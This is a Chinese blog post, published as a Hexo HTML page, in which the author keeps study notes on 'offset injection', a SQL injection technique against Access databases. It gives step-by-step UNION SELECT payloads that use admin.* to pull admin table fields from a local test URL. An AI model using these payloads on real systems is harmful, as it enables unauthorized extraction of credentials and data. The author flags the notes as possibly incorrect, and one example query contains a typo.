@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="偏移注入介绍偏移注入是指我们在知道表，但查询不出来字段的情况，如系统自带的数据库权限不够而无法通过联合查询访问到系统自带库来爆出字段，而因为字段过长，sqlmap也难以爆出；或者是数据库是access数据库，默认没有系统库；而当遇到类似这种情况的时候，我们就可以尝试通过偏移注入来查询表里的数据； *是通配符的意思，我们可以通过来表示sql语句中已知表中的所有字段，在下面我们可以通过admin.*来">
+<meta property="og:type" content="article">
+<meta property="og:title" content="access数据库之偏移注入">
+<meta property="og:url" content="http://allblue147.github.io/2019/12/07/access/index.html">
+<meta property="og:site_name" content="ALL BLUE">
+<meta property="og:description" content="偏移注入介绍偏移注入是指我们在知道表，但查询不出来字段的情况，如系统自带的数据库权限不够而无法通过联合查询访问到系统自带库来爆出字段，而因为字段过长，sqlmap也难以爆出；或者是数据库是access数据库，默认没有系统库；而当遇到类似这种情况的时候，我们就可以尝试通过偏移注入来查询表里的数据； *是通配符的意思，我们可以通过来表示sql语句中已知表中的所有字段，在下面我们可以通过admin.*来">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-12-06T17:49:29.105Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="access数据库之偏移注入">
+<meta name="twitter:description" content="偏移注入介绍偏移注入是指我们在知道表，但查询不出来字段的情况，如系统自带的数据库权限不够而无法通过联合查询访问到系统自带库来爆出字段，而因为字段过长，sqlmap也难以爆出；或者是数据库是access数据库，默认没有系统库；而当遇到类似这种情况的时候，我们就可以尝试通过偏移注入来查询表里的数据； *是通配符的意思，我们可以通过来表示sql语句中已知表中的所有字段，在下面我们可以通过admin.*来">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>access数据库之偏移注入</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2019/12/07/domxss/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2019/12/07/access/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2019/12/07/access/&text=access数据库之偏移注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2019/12/07/access/&title=access数据库之偏移注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2019/12/07/access/&is_video=false&description=access数据库之偏移注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=access数据库之偏移注入&body=Check out this article: http://allblue147.github.io/2019/12/07/access/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2019/12/07/access/&title=access数据库之偏移注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2019/12/07/access/&title=access数据库之偏移注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2019/12/07/access/&title=access数据库之偏移注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2019/12/07/access/&title=access数据库之偏移注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2019/12/07/access/&name=access数据库之偏移注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2019/12/07/access/&t=access数据库之偏移注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#偏移注入介绍"><span class="toc-number">1.</span> <span class="toc-text">偏移注入介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-number">2.</span> <span class="toc-text">*</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#偏移注入流程"><span class="toc-number">3.</span> <span class="toc-text">偏移注入流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#具体做法讲解"><span class="toc-number">4.</span> <span class="toc-text">具体做法讲解</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        access数据库之偏移注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">JYP</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-12-06T17:03:10.403Z" itemprop="datePublished">2019-12-07</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/笔记/">笔记</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="偏移注入介绍"><a href="#偏移注入介绍" class="headerlink" title="偏移注入介绍"></a>偏移注入介绍</h2><p>偏移注入是指我们在知道表，但查询不出来字段的情况，如系统自带的数据库权限不够而无法通过联合查询访问到系统自带库来爆出字段，而因为字段过长，sqlmap也难以爆出；或者是数据库是access数据库，默认没有系统库；而当遇到类似这种情况的时候，我们就可以尝试通过偏移注入来查询表里的数据；</p>
+<h2 id><a href="#" class="headerlink" title="*"></a>*</h2><p><em>是通配符的意思，我们可以通过</em>来表示sql语句中已知表中的所有字段，在下面我们可以通过admin.*来表示admin表的所有字段。</p>
+<h2 id="偏移注入流程"><a href="#偏移注入流程" class="headerlink" title="偏移注入流程"></a>偏移注入流程</h2><ol>
+<li>判断注入点</li>
+<li>order by 判断字段数</li>
+<li>知道表名</li>
+<li>联合查询</li>
+<li>获取表中列数(知道存在几个字段以及输出点在哪)</li>
+<li>开始偏移注入</li>
+</ol>
+<h2 id="具体做法讲解"><a href="#具体做法讲解" class="headerlink" title="具体做法讲解"></a>具体做法讲解</h2><p>如果我们已经知道的是admin这张表；<br>我们可以通过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exists(selct * from admin);</span><br></pre></td></tr></table></figure>
+<p>来猜测是否有admin表，如果说存在的话页面就会显示正常。</p>
+<p>exists函数的用法：EXISTS用于检查子查询是否至少会返回一行数据，该子查询实际上并不返回任何数据，而是返回值True或False</p>
+<p>这里我们需要注意的是，access数据库联合查询后面是必须from一个表名，如果不知道表名，就直接用admin表，access数据库基本上有这个表。</p>
+<ul>
+<li><strong>判断字段数：</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=1 order by 27  //错误显示</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=1 order by 26 //正常显示</span><br></pre></td></tr></table></figure>
+<p>说明字段为26个字段</p>
+<ul>
+<li><strong>联合查询爆出显示位</strong>:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin</span><br></pre></td></tr></table></figure>
+<p>发现显示位是2，5，7；</p>
+<ul>
+<li><strong>开始偏移进行注入</strong></li>
+</ul>
+<p>在这里我们通过admin.*来表示admin表下的所有字段；</p>
+<ul>
+<li>admin表下所存在字段数：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,admin.* from admin</span><br></pre></td></tr></table></figure>
+<p> 显示错误，说明admin表下字段不止一个，继续测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,admin.* from admin</span><br></pre></td></tr></table></figure>
+<p>正常回显，说明admin下字段有8个;</p>
+<ul>
+<li>我们在通过偏移进行爆出字段内容：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/new.php?id=-1 union select 1,2,3,4,5,6,admin.*,15,16,17,18,19,20,21,22,23,24,25,26 from admin</span><br></pre></td></tr></table></figure>
+<p>通过偏移到显示位，查看字段内容，如想继续看其他字段可继续偏移；</p>
+<p>（这里记录的一切只代表我学习的笔记,不一定全部正确，如果有错误之处还望指正！）</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#偏移注入介绍"><span class="toc-number">1.</span> <span class="toc-text">偏移注入介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#"><span class="toc-number">2.</span> <span class="toc-text">*</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#偏移注入流程"><span class="toc-number">3.</span> <span class="toc-text">偏移注入流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#具体做法讲解"><span class="toc-number">4.</span> <span class="toc-text">具体做法讲解</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2019/12/07/access/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2019/12/07/access/&text=access数据库之偏移注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2019/12/07/access/&title=access数据库之偏移注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2019/12/07/access/&is_video=false&description=access数据库之偏移注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=access数据库之偏移注入&body=Check out this article: http://allblue147.github.io/2019/12/07/access/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2019/12/07/access/&title=access数据库之偏移注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2019/12/07/access/&title=access数据库之偏移注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2019/12/07/access/&title=access数据库之偏移注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2019/12/07/access/&title=access数据库之偏移注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2019/12/07/access/&name=access数据库之偏移注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2019/12/07/access/&t=access数据库之偏移注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    JYP
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
